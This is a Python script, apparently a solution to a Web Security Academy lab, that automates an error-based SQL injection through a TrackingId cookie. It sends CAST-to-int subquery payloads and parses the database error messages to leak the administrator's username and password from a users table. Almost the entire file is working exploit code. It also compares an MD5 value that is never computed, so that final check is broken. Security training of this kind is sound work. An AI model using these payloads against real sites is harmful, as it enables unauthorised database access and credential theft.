# This lab contains a SQL injection vulnerability.
# The application uses a tracking cookie for analytics,
# and performs a SQL query containing the value of the submitted cookie.
# The results of the SQL query are not returned.

# The database contains a different table called users, with columns called username and password.
# To solve the lab, find a way to leak the password for the administrator user, then log in to their account.

import re
import requests
import hashlib
from bs4 import BeautifulSoup

# Session ID
sid = "0a03004c03ef203580e34e40009e00f3"
# URL to send GET request to
url = f"https://{sid}.web-security-academy.net"
print(f"URL: {url}")

response_body_md5 = ""
response_body_md5_new = ""

# Payloads dictionary to be used in the SQL injection
payloads = {
    "username": "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--", # Adapt your generic SELECT statement so that it retrieves usernames from the database
    "password": "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--" # Adapt your generic SELECT statement so that it retrieves passwords from the database
}

try:
    # First request to get the original response
    response = requests.get(url)
    response.raise_for_status()  # Raise an exception for bad responses (4xx or 5xx)

    # Get response body md5 sum
    response_body_md5 = hashlib.md5(response.text.encode()).hexdigest()
    # print(f"Original Response body md5 sum: {response_body_md5}")

    # Search for the specific "Set-Cookie" header
    tracking_cookie = response.headers.get("Set-Cookie")
    if tracking_cookie:
        # Extract the "TrackingId" value from the "Set-Cookie" header
        tracking_id = tracking_cookie.split("=")[1].split(";")[0]

        # Extract the "session" value from the "Set-Cookie" header
        session = tracking_cookie.split("=")[2].split(";")[0]

    # print("Response Headers:")
    # for header, value in response.headers.items():
    #     print(f"{header}: {value}")

    # Start loop in payloads dictionary
    for key, value in payloads.items():
        # Modify the tracking_id by adding the following payload:
        # 1. SELECT username FROM users LIMIT 1
        # 2. SELECT password FROM users LIMIT 1
        print(f"Modifying tracking_id with payload: {value}")
        modified_tracking_id = f"{value}"

        # Resend the request with the modified headers
        headers = {
            'Host': f"{sid}.web-security-academy.net",
            'Cookie': f'TrackingId={modified_tracking_id}; session={session}',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Linux"',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Priority': 'u=0, i'
        }

        # Sending modified request
        response_new = requests.get(url, headers=headers)

        # Use BeautifulSoup to parse the HTML content
        soup = BeautifulSoup(response_new.text, 'html.parser')

        # Find and print the error line
        error_line = soup.find('h4').text
        match = re.search(r'"([^"]*)"', error_line)

        if match:
            extracted_text = match.group(1)
            print(f"{key}: {extracted_text}")
        else:
            print(f"No match found in Error Line {key}")

    # Compare the MD5 sums
    if response_body_md5 == response_body_md5_new:
        print("Response bodies are the same.")
    else:
        print("Response bodies are different.")

except requests.exceptions.RequestException as e:
    print(f"Error: {e}")
